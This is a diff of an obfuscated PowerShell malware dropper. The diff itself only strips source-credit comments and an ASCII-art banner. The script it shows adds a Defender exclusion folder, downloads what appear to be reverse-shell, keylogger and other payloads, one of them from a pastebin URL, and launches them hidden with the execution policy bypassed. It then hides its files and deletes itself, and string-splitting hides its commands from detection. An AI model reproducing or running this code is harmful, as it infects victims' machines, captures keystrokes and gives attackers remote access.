@@ -5,8 +5,8 @@ mkdir \win64;
 add-mppreference -exclusionpath 'c:\win64'
 cd win''64;
 Start-Sleep -Seconds 3;
-wg''et ">>URL1<<" -OutFile pyld_rv.p''s1; # rgbwiki.com
-wg''et "pastebin.com/raw/F5GjFZWK" -OutFile pyld_kl.p''s1; # hinchley.net
+wg''et ">>URL1<<" -OutFile pyld_rv.p''s1;
+wg''et "pastebin.com/raw/F5GjFZWK" -OutFile pyld_kl.p''s1;
 Start-Sleep -Seconds 3;
 wg''et ">>URL2<<" -OutFile pyld_ds.p''s1;
 '(cmd /c start /min "" powe""rshe""ll -Windo""wStyle Hid""den -Execu""tionPolicy By""Pass -File "c:/win64/pyld_rv.ps1")' | Out-F''ile init_rv.ba''t -Encoding ascii;
@@ -14,16 +14,7 @@ wg''et ">>URL2<<" -OutFile pyld_ds.p''s1;
 '(cmd /c start /min "" powe""rshe""ll -Windo""wStyle Hid""den -Execu""tionPolicy By""Pass -File "c:/win64/pyld_ds.ps1")' | Out-F''ile init_ds.ba''t -Encoding ascii;
 .\init_rv.ba''t;
 .\init_kl.ba''t;
-attrib +h;
+attrib +h; 
 attrib +h .;
 powe""rshe""ll rm ~/w.ps1 -Force;
-exit;:"
-
-                       /$$     /$$                      /$$ /$$
-                      | $$    |__/                     |__/| $$
-  /$$$$$$  /$$$$$$$  /$$$$$$   /$$  /$$$$$$  /$$    /$$ /$$| $$
- |____  $$| $$__  $$|_  $$_/  | $$ /$$__  $$|  $$  /$$/| $$| $$
-  /$$$$$$$| $$  \ $$  | $$    | $$| $$$$$$$$ \  $$/$$/ | $$| $$
- /$$__  $$| $$  | $$  | $$ /$$| $$| $$_____/  \  $$$/  | $$| $$
-|  $$$$$$$| $$  | $$  |  $$$$/| $$|  $$$$$$$   \  $/   | $$| $$
- \_______/|__/  |__/   \___/  |__/ \_______/    \_/    |__/|__"
+exit;
